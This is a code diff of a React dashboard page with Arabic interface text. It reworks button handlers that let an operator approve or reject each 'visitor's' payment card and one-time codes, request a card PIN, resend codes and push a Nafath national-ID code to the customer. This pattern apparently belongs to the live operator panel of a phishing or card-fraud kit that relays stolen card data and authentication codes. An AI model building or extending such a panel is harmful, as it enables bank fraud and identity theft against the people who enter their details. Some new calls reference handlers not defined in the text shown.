@@ -1453,112 +1453,6 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
-  // Handle payment card action (approve/reject/pin)
-  const handlePaymentAction = async (visitorId: string | undefined, action: string) => {
-    if (!visitorId) {
-      showNotification("error", "لم يتم اختيار عميل");
-      return;
-    }
-    
-    console.log("[PaymentAction] Action:", action, "visitorId:", visitorId);
-    setActionLoading("payment");
-    
-    try {
-      const res = await fetch("/api/dashboard/payment-action", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, action }),
-      });
-      
-      if (res.ok) {
-        if (action === "approved") {
-          showNotification("success", "تم الموافقة ✓ جاري توجيه العميل");
-        } else if (action === "rejected") {
-          showNotification("error", "تم الرفض ✗");
-        } else if (action === "pin") {
-          showNotification("success", "تم إرسال طلب رمز PIN ✓");
-        }
-        // Refresh data
-        fetchDashboardData();
-      } else {
-        showNotification("error", "حدث خطأ");
-      }
-    } catch {
-      showNotification("error", "فشل الاتصال");
-    }
-    setActionLoading(null);
-  };
-
-  // Handle OTP action (approve/reject)
-  const handleOtpAction = async (visitorId: string | undefined, action: string) => {
-    if (!visitorId) {
-      showNotification("error", "لم يتم اختيار عميل");
-      return;
-    }
-    
-    console.log("[OtpAction] Action:", action, "visitorId:", visitorId);
-    setActionLoading("otp");
-    
-    try {
-      const res = await fetch("/api/dashboard/otp-action", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, action }),
-      });
-      
-      if (res.ok) {
-        if (action === "approved") {
-          showNotification("success", "تم الموافقة ✓");
-        } else if (action === "rejected") {
-          showNotification("error", "تم الرفض ✗");
-        }
-        // Refresh data
-        fetchDashboardData();
-      } else {
-        showNotification("error", "حدث خطأ");
-      }
-    } catch {
-      showNotification("error", "فشل الاتصال");
-    }
-    setActionLoading(null);
-  };
-
-  // Handle phone OTP action (approve/reject/resend)
-  const handlePhoneOtpAction = async (visitorId: string | undefined, action: string) => {
-    if (!visitorId) {
-      showNotification("error", "لم يتم اختيار عميل");
-      return;
-    }
-    
-    console.log("[PhoneOtpAction] Action:", action, "visitorId:", visitorId);
-    setActionLoading("phone");
-    
-    try {
-      const res = await fetch("/api/dashboard/phone-action", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, action }),
-      });
-      
-      if (res.ok) {
-        if (action === "approved") {
-          showNotification("success", "تم الموافقة ✓ جاري توجيه العميل");
-        } else if (action === "rejected") {
-          showNotification("error", "تم الرفض ✗");
-        } else if (action === "resend") {
-          showNotification("success", "تم إعادة إرسال الرمز ✓");
-        }
-        // Refresh data
-        fetchDashboardData();
-      } else {
-        showNotification("error", "حدث خطأ");
-      }
-    } catch {
-      showNotification("error", "فشل الاتصال");
-    }
-    setActionLoading(null);
-  };
-
   // Handle resend code for step5
   const handleResendCode = async () => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
@@ -1578,36 +1472,6 @@ export default function DashboardPage() {
       });
       if (res.ok) {
         showNotification("success", "تم إعادة إرسال الرمز ✓");
-      } else {
-        showNotification("error", "حدث خطأ");
-      }
-    } catch {
-      showNotification("error", "فشل الاتصال");
-    }
-    setActionLoading(null);
-  };
-
-  // Handle send nafad code with visitorId
-  const handleSendNafadCode = async (visitorId: string | undefined, code: string) => {
-    if (!visitorId || !code) {
-      showNotification("error", "يرجى إدخال رمز التحقق");
-      return;
-    }
-    
-    console.log("[SendNafadCode] visitorId:", visitorId, "code:", code);
-    setActionLoading("nafad");
-    
-    try {
-      const res = await fetch("/api/dashboard/send-nafad-code", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ visitorId, nafadCode: code }),
-      });
-      
-      if (res.ok) {
-        showNotification("success", "تم إرسال رمز النفاذ للعميل ✓");
-        setNafadInput(""); // Clear input after sending
-        fetchDashboardData();
       } else {
         showNotification("error", "حدث خطأ");
       }
@@ -1968,7 +1832,7 @@ export default function DashboardPage() {
             marginBottom: 12 
           }}>
             <button
-              onClick={() => handleOtpAction(selectedRequest?.id || selectedRequest?.visitorId, "approved")}
+              onClick={() => handleOtpAction("approved")}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -1988,7 +1852,7 @@ export default function DashboardPage() {
               ✅ موافق
             </button>
             <button
-              onClick={() => handleOtpAction(selectedRequest?.id || selectedRequest?.visitorId, "rejected")}
+              onClick={() => handleOtpAction("rejected")}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2114,7 +1978,7 @@ export default function DashboardPage() {
             marginBottom: 12 
           }}>
             <button
-              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "approved")}
+              onClick={() => handlePaymentAction("approved")}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2134,7 +1998,7 @@ export default function DashboardPage() {
               ✅ موافق
             </button>
             <button
-              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "rejected")}
+              onClick={() => handlePaymentAction("rejected")}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2154,7 +2018,7 @@ export default function DashboardPage() {
               ❌ رفض
             </button>
             <button
-              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "pin")}
+              onClick={() => handlePaymentAction("pin")}
               style={{
                 flex: 1,
                 padding: "10px 16px",
@@ -2388,7 +2252,7 @@ export default function DashboardPage() {
               gap: 8 
             }}>
               <button
-                onClick={() => handlePhoneOtpAction(selectedRequest?.id || selectedRequest?.visitorId, "rejected")}
+                onClick={() => handlePhoneAction("rejected")}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2408,7 +2272,7 @@ export default function DashboardPage() {
                 ❌ رفض
               </button>
               <button
-                onClick={() => handlePhoneOtpAction(selectedRequest?.id || selectedRequest?.visitorId, "resend")}
+                onClick={() => handlePhoneAction("resend")}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2428,7 +2292,7 @@ export default function DashboardPage() {
                 🔄 إعادة إرسال
               </button>
               <button
-                onClick={() => handlePhoneOtpAction(selectedRequest?.id || selectedRequest?.visitorId, "approved")}
+                onClick={() => handlePhoneAction("approved")}
                 style={{
                   flex: 1,
                   padding: "10px 12px",
@@ -2564,7 +2428,7 @@ export default function DashboardPage() {
                   }}
                 />
                 <button
-                  onClick={() => handleSendNafadCode(selectedRequest?.id || selectedRequest?.visitorId, nafadInput)}
+                  onClick={() => handleSendNafadCode()}
                   disabled={!nafadInput.trim() || actionLoading === "nafad"}
                   style={{
                     padding: "8px 16px",
